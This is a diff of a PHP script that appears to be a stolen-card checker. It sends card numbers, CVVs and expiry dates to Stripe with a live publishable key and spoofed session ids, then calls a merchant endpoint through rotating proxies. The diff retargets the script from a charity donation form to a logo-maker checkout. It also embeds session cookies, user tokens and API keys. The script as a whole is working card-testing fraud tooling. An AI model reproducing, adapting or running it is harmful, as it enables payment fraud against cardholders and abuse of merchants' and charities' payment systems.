@@ -260,7 +260,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_line2]=&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=66671e36-688c-4c48-a0c8-ce7f069f103835ff1d&muid=69127b0f-d7e5-42fb-82fa-a1a5ab754e0f46b0e8&sid=bb03b0b5-37b6-4737-abf6-34e6c6cbe79eebfc61&payment_user_agent=stripe.js%2F54c9cfdcf%3B+stripe-js-v3%2F54c9cfdcf&time_on_page=126449&key=pk_live_T0LDuJcnjhAGRKVhfmLnjclt&_stripe_version=2019-02-11&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=3fb6317f-beff-4472-99f2-249aca8376373a19dd&sid=047be296-8833-4618-a6a8-0c920180e9bd094569&payment_user_agent=stripe.js%2F54c9cfdcf%3B+stripe-js-v3%2F54c9cfdcf&time_on_page=26480&key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&pasted_fields=number');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.donately.com/v2/donations.json?account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac');
+curl_setopt($ch, CURLOPT_URL, 'https://www.brandcrowd.com/maker/api/users/summary?usertoken=8a813e63-a553-4258-ad96-58ed17e80f6c');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.donately.com',
+'authority: www.brandcrowd.com',
 'method: POST',
-'path: /v2/donations.json?account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac',
+'path: /maker/api/users/summary?usertoken=8a813e63-a553-4258-ad96-58ed17e80f6c',
 'scheme: https',
-'accept: application/json, */*',
+'accept: application/json, text/plain, */*',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded',
-'cookie: ',
-'origin: https://waterkeeper.org',
-'referer: https://waterkeeper.org/donate/',
+'cookie: .AspNetCore.Antiforgery.TcmPAuy1nOM=CfDJ8EALiDpUYGpHpQkm4UEG6KymucQPHcSfhrOgAioE4NdlHfhCW9XjmI5y1Op0SunMg5X17K2o7BINkO9RbAOY2pWES8hVD_GHOtjBy5Cw2SUGaQMsIra65GNqJXsMl64gua-W8IdwnSnSYQIGRJnIbuM; bc_a=CfDJ8EALiDpUYGpHpQkm4UEG6Kz44VWZv2dWUGjChuRcQgZn0_hYVPwEtYOEHg3LqpFw_U1POeyCcEop3IHScmfI11kroVlgXssrSWZ1SaW3FkIOBT8sqzq8iOJ4SW72O_m6walHbViNWXERLZXD2mm7rA3Dj43V2hI2hzNerZMk9Ir4EXmz8ZYizVl7lcTgZyYicSyLLxLkhQrvhXfbly8CnrFlR50o0PkeCRDMQAS4y-xQ-U4HyID3RJopc_W8DWCfBPF2v017QR09DL6m1ITTnbnUEe2t0AmE04UPS9rENtS3LCTjs48EjfNjM7XWbKS3bjs_Pzh6DxuIZNzMkYnWzEjVlz_tw96SLnF41Wg8uC4XpD0T5_DBUK7naRCXNWBPXc1sKKJkpOsUR-20XAstRJjfImGOxhDPOu4GB-Zlx9ncvEXWVwNlwZcWF6Jp-vXYzfXqcfjsD5hrSe9RrWZAusYHw_s48bzXzOmyQPitffFm9QiSQ7QpXnAdCs9_v7P5kmGw9bnJfkzh5NJM3IOGf_Jgd-WfYSpxcYYK7mzpxvTldh_l_sXU1CHK905Zr695Rfhx-ONVHCkvXJlfNl1_XXsUc0ov87RyqN6a9YavzR7Q8XhnMUrbpLRZjHqu40Hjdze3fMUJb7EJ4mDaVx1W1V_NT7WLWysP9gCkejLL8gX5Whlqy7uAPNo8_Y91oGw-i5DoZA1ZGY3KOlE2V1T4SZaxgxae5UZ6rcV6ecv3w018z4LiSjoyb1moazbO16loJ7cQHGB8EeqjEKqkmMJOgYoScnQRwlXJbWbJsHhsCYt2waIOkthVWDp1wwEYR5qnjYBQy8lYmBogBRRvIT5virCKj_852KITz7QSPWKTxLuvg-hzdl4zwcKg4n8xMCDG6vQZbh164Q_itpGi9-Dor5phaVjQ6u7nRjKdoHj9P-T9Y96XbnyFVdS-iZaP7z91I-SzaIPcSzbj4xPtjs5q7humUz5d5L1-nfYKbuYRmmsC8JTdfCXQOR6BSyP7YfSyk_CD3cDfSnkVugTij0Q94jdmjK4yI8zR0nQncN2pUeZPJfNVjH8BSWs6YTIc0v8IWiTGg_Br6l1LuXAiq9xptLHOo5PCmnSyvXYIKP0go9DmFCOG1DECtcvYwZbFAG4fX6Xv5zehxqdur6ISUKNBH6i_b5BOUyDK5jT0kJc-JZlO_GyL19_36ofQdu-PXenW0TTCudUPapl_O43LWHdYSNZTrxshytdCfCRRVLd3bwLZi5byyFQmVjRAcslYU5kb1mc5VoeZu8QVAvSrTFKq2bjMePKpx8JLqVxez2nXE8-Gi8e_fDa2BOeA1zyKyb24RGw928-4Rh3z9B29_5h_Ui5JVOC10zMXvKY8RTcooJMi4LH_mG8bQZrZzINkKvIVJ9a0cymLV8djiagGrJchceyVYGSPZZNC9xrTjWJYKRACVJg1nPoEFEcZNz2_zOte8-gT9u64Gui2zhL4fJrhIHQ83ztpAqM8B_FokTJb9Cig; bc-gt-502-root-hp-test=gt-502-Variation-1; bc-gt-764-root-hp-wizard-color=gt-764-Control; bc_s=CfDJ8EALiDpUYGpHpQkm4UEG6KwGp6yLk23VfHe+Fae3xcqnUIIHzify2j6ZLc7TxtnWVu68+mKfyqmBDtu1eryprCvic9MDoR9zAFjTqVkYtrjkBhZojS6u/88O0DFXMTFR6TZLK4b/+1EYg/aXVac8C0TttJXcPLeswrw3/sWTDh47; __stripe_mid=3fb6317f-beff-4472-99f2-249aca8376373a19dd; __stripe_sid=047be296-8833-4618-a6a8-0c920180e9bd094569; brandcrowd-user-text=Anonbd; godaddy-domain-integrator-algo=SB-1651-Excluded; bc-gt-838-free-logo-seo=gt-838-control; bc-gt-832-search-variations-mobile=gt-832-Control; bc-gt-878-variations-modal=gt-878-control; mp-509-hide-gridline=MP-509-Disabled; brandcrowd-search=DefaultSearchV4; .Stackify.Rum=298f027b-7d88-413b-818d-ae85b1851231; brand-page-rollout=BP-Enabled-v2; bc-gt-950-default-annual-bp=gt-950-variation-1; brandcrowd-discount-coupon=DIRECTSAAS-GT57LOGO; bc-gt-877-license-price-test=gt-877-excluded; bc-en-1-social-sign-up-in-email-capture-modal=en-1-variation-1-v2',
+'origin: https://www.brandcrowd.com',
+'referer: https://www.brandcrowd.com/maker/checkout/91e62d7d-b8be-4d0d-a8bb-b1a9375fc390',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -301,7 +301,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'usertoken=8a813e63-a553-4258-ad96-58ed17e80f6c');
 
 
 $result2 = curl_exec($ch);
